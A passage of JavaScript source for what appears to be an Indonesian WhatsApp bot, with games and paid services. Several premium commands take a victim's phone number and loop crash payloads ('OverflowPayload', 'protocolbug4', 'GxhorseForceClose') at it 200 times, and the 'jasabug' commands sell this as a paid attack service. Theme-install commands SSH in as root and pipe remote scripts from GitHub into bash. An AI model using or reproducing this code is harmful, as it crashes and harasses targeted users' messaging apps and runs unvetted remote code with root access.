Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
            const ress = new Client();

            ress.on('ready', () => {
                m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selesai.");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async (code, signal) => {    
                        await m.reply("Berhasil install *tema enigma* pterodactyl ✅");
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                        stream.write(`skyzodev\n`); // Key Token : skyzodev
                        stream.write('1\n');
                        stream.write('3\n');
                        stream.write('https://wa.me/6285624297893\n');
                        stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
                        stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
                        stream.write('yes\n');
                        stream.write('x\n');
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                m.reply('Kata sandi atau IP VPS tidak valid.');
            }).connect(connSettings);

            await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case 'suit':
    if (!args[0]) return reply('Gunakan: .suit batu/gunting/kertas')
    let pilihan = ['batu', 'gunting', 'kertas']
    let botChoice = pilihan[Math.floor(Math.random() * pilihan.length)]
    let userChoice = args[0].toLowerCase()

    if (!pilihan.includes(userChoice)) return reply('Pilihan tidak valid! Gunakan: batu, gunting, atau kertas.')

    if (userChoice === botChoice) reply(`Seri! Bot memilih ${botChoice}`)
    else if (
        (userChoice === 'batu' && botChoice === 'gunting') ||
        (userChoice === 'gunting' && botChoice === 'kertas') ||
        (userChoice === 'kertas' && botChoice === 'batu')
    ) reply(`Kamu menang! Bot memilih ${botChoice}`)
    else reply(`Kamu kalah! Bot memilih ${botChoice}`)
    break
    
case "tebakkata": {
    if (db.users[m.sender].gameActive) {
        return m.reply("⚠️ Anda sudah memiliki game aktif. Selesaikan terlebih dahulu!");
    }

    const words = [
        { word: "komputer", hint: "Alat elektronik untuk menghitung dan memproses data" },
        { word: "stipo", hint: "Di Kocok Keluar Putih Putih" },
        { word: "softex", hint: "Di Pakai Saat Cewek Haid Atau Halangan" },
        { word: "bawel", hint: "Ikan Apa Yang Cerewet?" },
        { word: "semute", hint: "Hewan Apa Yang Bisu? " },
        { word: "matahari", hint: "Sumber energi terbesar di tata surya" },
        { word: "programmer", hint: "Pekerjaan seseorang yang menulis kode komputer" },
        { word: "pelangi", hint: "Fenomena warna-warni di langit setelah hujan" },
        { word: "kamera", hint: "Alat untuk mengambil gambar atau video" }
    ];

    const selected = words[Math.floor(Math.random() * words.length)];
    db.users[m.sender].gameActive = {
        word: selected.word,
        hint: selected.hint,
        attempts: 3 // Batas percobaan
    };

    m.reply(`🎮 *Game Tebak Kata*\n\n🔍 *Petunjuk*: ${selected.hint}\n📝 *Tebak kata ini!* (Punya 3 percobaan)\n\nKetik .jawab Unfuk Menjawab`);

    // Reset game setelah 1 menit jika tidak dijawab
    setTimeout(() => {
        if (db.users[m.sender].gameActive) {
            m.reply("⏳ Waktu habis! Game selesai tanpa jawaban.");
            delete db.users[m.sender].gameActive;
        }
    }, 60000);
}
break;

case "jawab": {
    if (!db.users[m.sender].gameActive) {
        return m.reply("⚠️ Anda belum memulai game. Ketik *.tebakkata* untuk memulai!");
    }

    const answer = db.users[m.sender].gameActive.word.toLowerCase();
    const userAnswer = text.toLowerCase();

    if (userAnswer === answer) {
        m.reply(`🎉 *Benar!*\nJawabannya adalah *${answer}*.\nSelamat! Anda berhasil menebak kata.`);
        delete db.users[m.sender].gameActive;
    } else {
        db.users[m.sender].gameActive.attempts -= 1;

        if (db.users[m.sender].gameActive.attempts <= 0) {
            m.reply(`❌ *Salah!*\nKesempatan habis. Jawaban yang benar adalah *${answer}*.`);
            delete db.users[m.sender].gameActive;
        } else {
            m.reply(`❌ Salah! Anda punya ${db.users[m.sender].gameActive.attempts} kesempatan lagi.`);
        }
    }
}
break;

case 'asist': {
if (!isPremium && !isCreator) return m.reply(mess.prem)
    if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 50; i++) {
        await protocolbug4(target)
        await protocolbug4(target)
        await OverflowPayload(target) 
        await OverflowPayload(target) 
    }
    await sleep(10);
    await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪");
}
break

case 'xtrash': {
if (!isPremium && !isCreator) return m.reply(mess.prem)
    if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 50; i++) {
        await SpaceGroup(target) 
        await SpaceGroup(target) 
        await SpaceGroup(target) 
        await SpaceGroup(target)  
    }
    await sleep(1000);
    await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪");
}
break

case 'fchard': {
if (!isPremium && !isCreator) return m.reply(mess.prem)
    if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 50; i++) {
        await GxhorseForceClose(target) 
        await GxhorseForceClose(target) 
        await GxhorseForceClose(target) 
        await GxhorseForceClose(target)  
    }
    await sleep(1000);
    await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪");
}
break

case 'flowfc': {
if (!isPremium && !isCreator) return m.reply(mess.prem)
    if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 50; i++) {
        await SpaceGroup(target) 
        await SpaceGroup(target) 
        await GxhorseForceClose(target) 
        await GxhorseForceClose(target)  
    }
    await sleep(1000);
    await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪");
}
break

case 'xdwiaff': {
if (!isPremium && !isCreator) return m.reply(mess.prem)
    if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 50; i++) {
        await OverflowPayload(target) 
        await OverflowPayload(target) 
        await OverflowPayload(target) 
        await OverflowPayload(target) 
    }
    await sleep(1000);
    await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪");
}
break

case 'affifa': {
if (!isPremium && !isCreator) return m.reply(mess.prem)
    if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 50; i++) {
        await protocolbug4(target) 
        await protocolbug4(target) 
        await protocolbug4(target) 
        await protocolbug4(target) 
    }
    await sleep(1000);
    await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪");
}
break

case 'dwi': {
if (!isPremium && !isCreator) return m.reply(mess.prem)
    if (!q) return reply(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 50; i++) {
        await OverflowPayload(target) 
        await OverflowPayload(target) 
        await OverflowPayload(target) 
        await OverflowPayload(target) 
    }
    await sleep(10);
    await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪"); 
}
break

case "jasabugfc": {
    if (!q) return reply(`⚠️ *Contoh Penggunaan:*\n\n_${prefix + command} 6287392784527_`);

    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return reply(`⚠️ *Kesalahan Format Nomor!*\n\n💀 _Nomor tidak boleh dimulai dengan 0. Gunakan kode negara di depan nomor._\n\n📌 *Contoh:* ${prefix + command} 6287392784527`);
    }

    const UrlQr = global.qrisOrderKuota;

    // Harga pengiriman bug + angka unik
    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    let amount = 3000 + generateRandomNumber(100, 300); // Harga jasa bug random
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
╔═════❰ 𝘽𝙐𝙂 𝙏𝙀𝙍𝙆𝙄𝙍𝙄𝙈 ❱═════╗
║ 🕷️ *INFORMASI PEMBAYARAN* 🕷️
║
║ 🔥 *• ID Transaksi:* ${get.data.result.transactionId}
║ 👹 *• Total Pembayaran:* Rp${await toIDR(get.data.result.amount)}
║ ☠️ *• Barang:* Jasa Bug Random
║ ⏳ *• Expired:* 5 Menit
║
║ ⚠️ *Catatan Penting:*
║ ⚔️ QRIS pembayaran hanya berlaku selama *5 menit*.
║ 💣 Bug akan otomatis terkirim setelah pembayaran sukses!
║
║ 🚷 *Ketik:* *.batalbeli* _untuk membatalkan transaksi._
╚═══════════════════════════╝
`;

    let msgQr = await dwiaff.sendMessage(
        m.chat, 
        { 
            image: { url: get.data.result.qrImageUrl }, 
            caption: teksPembayaran 
        }, 
        { quoted: m }
    );

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(
                        db.users[m.sender].saweria.chat, 
                        { text: "💀 *QRIS pembayaran telah expired!*" }, 
                        { quoted: db.users[m.sender].saweria.msg }
                    );
                    await dwiaff.sendMessage(
                        db.users[m.sender].saweria.chat, 
                        { delete: db.users[m.sender].saweria.msg.key }
                    );
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const target = bijipler + "@s.whatsapp.net";
            for (let i = 0; i < 50; i++) {
                await OverflowPayload(target);
                await OverflowPayload(target);
                await OverflowPayload(target);
                await OverflowPayload(target);
            }

            await dwiaff.sendMessage(
                db.users[m.sender].saweria.chat, 
                { 
                    text: "☠️ *Pembayaran berhasil!*\n💣 Bug telah berhasil dikirim ke target! 💀", 
                }, 
                { quoted: db.users[m.sender].saweria.msg }
            );

            await reply("🔥 *Bug berhasil dikirim ke target!* ✅");
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case "jasabugui": {
    if (!q) return reply(`⚠️ *Contoh Penggunaan:*\n\n_${prefix + command} 6287392784527_`);

    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return reply(`⚠️ *Kesalahan Format Nomor!*\n\n💀 _Nomor tidak boleh dimulai dengan 0. Gunakan kode negara di depan nomor._\n\n📌 *Contoh:* ${prefix + command} 6287392784527`);
    }

    const UrlQr = global.qrisOrderKuota;

    // Harga pengiriman bug + angka unik
    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    let amount = 5000 + generateRandomNumber(100, 300); // Harga jasa bug random
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
╔═════❰ 𝘽𝙐𝙂 𝙏𝙀𝙍𝙆𝙄𝙍𝙄𝙈 ❱═════╗
║ 🕷️ *INFORMASI PEMBAYARAN* 🕷️
║
║ 🔥 *• ID Transaksi:* ${get.data.result.transactionId}
║ 👹 *• Total Pembayaran:* Rp${await toIDR(get.data.result.amount)}
║ ☠️ *• Barang:* Jasa Bug Random
║ ⏳ *• Expired:* 5 Menit
║
║ ⚠️ *Catatan Penting:*
║ ⚔️ QRIS pembayaran hanya berlaku selama *5 menit*.
║ 💣 Bug akan otomatis terkirim setelah pembayaran sukses!
║
║ 🚷 *Ketik:* *.batalbeli* _untuk membatalkan transaksi._
╚═══════════════════════════╝
`;

    let msgQr = await dwiaff.sendMessage(
        m.chat, 
        { 
            image: { url: get.data.result.qrImageUrl }, 
            caption: teksPembayaran 
        }, 
        { quoted: m }
    );

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(
                        db.users[m.sender].saweria.chat, 
                        { text: "💀 *QRIS pembayaran telah expired!*" }, 
                        { quoted: db.users[m.sender].saweria.msg }
                    );
                    await dwiaff.sendMessage(
                        db.users[m.sender].saweria.chat, 
                        { delete: db.users[m.sender].saweria.msg.key }
                    );
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const target = bijipler + "@s.whatsapp.net";
            for (let i = 0; i < 50; i++) {
                await OverflowPayload(target) 
                await OverflowPayload(target)
                await OverflowPayload(target) 
                await OverflowPayload(target) 
            }

            await dwiaff.sendMessage(
                db.users[m.sender].saweria.chat, 
                { 
                    text: "☠️ *Pembayaran berhasil!*\n💣 Bug telah berhasil dikirim ke target! 💀", 
                }, 
                { quoted: db.users[m.sender].saweria.msg }
            );

            await reply("🔥 *Bug berhasil dikirim ke target!* ✅");
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case "jasabugios": {
    if (!q) return reply(`⚠️ *Contoh Penggunaan:*\n\n_${prefix + command} 6287392784527_`);

    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return reply(`⚠️ *Kesalahan Format Nomor!*\n\n💀 _Nomor tidak boleh dimulai dengan 0. Gunakan kode negara di depan nomor._\n\n📌 *Contoh:* ${prefix + command} 6287392784527`);
    }

    const UrlQr = global.qrisOrderKuota;

    // Harga pengiriman bug + angka unik
    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    let amount = 4000 + generateRandomNumber(100, 300); // Harga jasa bug random
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
╔═════❰ 𝘽𝙐𝙂 𝙏𝙀𝙍𝙆𝙄𝙍𝙄𝙈 ❱═════╗
║ 🕷️ *INFORMASI PEMBAYARAN* 🕷️
║
║ 🔥 *• ID Transaksi:* ${get.data.result.transactionId}
║ 👹 *• Total Pembayaran:* Rp${await toIDR(get.data.result.amount)}
║ ☠️ *• Barang:* Jasa Bug Random
║ ⏳ *• Expired:* 5 Menit
║
║ ⚠️ *Catatan Penting:*
║ ⚔️ QRIS pembayaran hanya berlaku selama *5 menit*.
║ 💣 Bug akan otomatis terkirim setelah pembayaran sukses!
║
║ 🚷 *Ketik:* *.batalbeli* _untuk membatalkan transaksi._
╚═══════════════════════════╝
`;

    let msgQr = await dwiaff.sendMessage(
        m.chat, 
        { 
            image: { url: get.data.result.qrImageUrl }, 
            caption: teksPembayaran 
        }, 
        { quoted: m }
    );

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(
                        db.users[m.sender].saweria.chat, 
                        { text: "💀 *QRIS pembayaran telah expired!*" }, 
                        { quoted: db.users[m.sender].saweria.msg }
                    );
                    await dwiaff.sendMessage(
                        db.users[m.sender].saweria.chat, 
                        { delete: db.users[m.sender].saweria.msg.key }
                    );
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const target = bijipler + "@s.whatsapp.net";
            for (let i = 0; i < 50; i++) {
                await OverflowPayload(target) 
                await OverflowPayload(target)
                await OverflowPayload(target) 
                await OverflowPayload(target) 
            }

            await dwiaff.sendMessage(
                db.users[m.sender].saweria.chat, 
                { 
                    text: "☠️ *Pembayaran berhasil!*\n💣 Bug telah berhasil dikirim ke target! 💀", 
                }, 
                { quoted: db.users[m.sender].saweria.msg }
            );

            await reply("🔥 *Bug berhasil dikirim ke target!* ✅");
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case "jasainstalltemaelysium": {
    if (m.isGroup) return m.reply(mess.private);;
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
    const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Elysium Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`;
            const ress = new Client();

            ress.on('ready', () => {
                m.reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selesai.");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async (code, signal) => {    
                        await m.reply("Berhasil install *tema Elysium* pterodactyl ✅");
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                        stream.write('1\n');
                        stream.write('y\n');
                        stream.write('yes\n');
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                m.reply('Kata sandi atau IP VPS tidak valid.');
            }).connect(connSettings);

            await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case "jasainstalltemaenigma": {
    if (m.isGroup) return m.reply(mess.private);;
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
    const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Billing Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
            const ress = new Client();

            ress.on('ready', () => {
                m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selesai.");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async (code, signal) => {    
                        await m.reply("Berhasil install *tema billing* pterodactyl ✅");
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                        stream.write(`skyzodev\n`); // Key Token : skyzodev
                        stream.write('1\n');
                        stream.write('2\n');
                        stream.write('yes\n');
                        stream.write('x\n');
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                m.reply('Kata sandi atau IP VPS tidak valid.');
            }).connect(connSettings);

            await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case 'listsc': {
    if (!global.scripts) {
        try {
            // Membaca file scripts.json
            const data = fs.readFileSync('./dwiaffD/script.json', 'utf8');
            global.scripts = JSON.parse(data);
        } catch (err) {
            return m.reply('❌ *Gagal memuat daftar script!* Pastikan file scripts.json tersedia.');
        }
    }

    if (global.scripts.length === 0) {
        return m.reply('📜 *Daftar script kosong!* Tambahkan script menggunakan perintah /addscript.');
    }

    let message = '📂 *Daftar Script Tersedia:*\n\n';
    global.scripts.forEach((script, index) => {
        message += `🔢 *No*: ${index + 1}\n`;
        message += `📜 *Nama*: ${script.name}\n`;
        message += `💸 *Harga*: Rp${script.price}\n`;
    });

    m.reply(message);
    break;
}

case 'addscript': {
if (!isCreator) return reply(mess.owner)
    const args = text.split(' ');

    if (args.length < 3) {
        return m.reply(
            `❌ *Format salah!*\nGunakan perintah:\n/addscript <NamaScript> <Harga> <Link>\n\nContoh:\n/addscript RafanoV4 40000 https://mediafire.com/file.zip`
        );
    }

    const [name, price, ...urlArray] = args;
    const url = urlArray.join(' ');
    const newScript = { name, price: parseInt(price), url };

    if (!global.scripts) global.scripts = [];
    global.scripts.push(newScript);

    // Menyimpan script yang baru ditambahkan ke dalam file scripts.json
    fs.writeFileSync('./dwiaffD/script.json', JSON.stringify(global.scripts, null, 2));

    m.reply(`✅ *Script baru berhasil ditambahkan!*\n\n📜 *Nama*: ${name}\n💸 *Harga*: Rp${price}\n🔗 *Link*: ${url}`);
    break;
}
case 'delscript': {
    if (!isCreator) return reply(mess.owner)

    const args = text.split(' ');

    if (args.length < 1) {
        return m.reply(
            `❌ *Format salah!*\nGunakan perintah:\n/delscript <NamaScript>\n\nContoh:\n/delscript RafanoV4`
        );
    }

    const scriptName = args.join(' ').trim();

    if (!scriptName) {
        return m.reply('❌ *Nama script tidak boleh kosong!*');
    }

    // Memuat file scripts.json
    if (!global.scripts) {
        try {
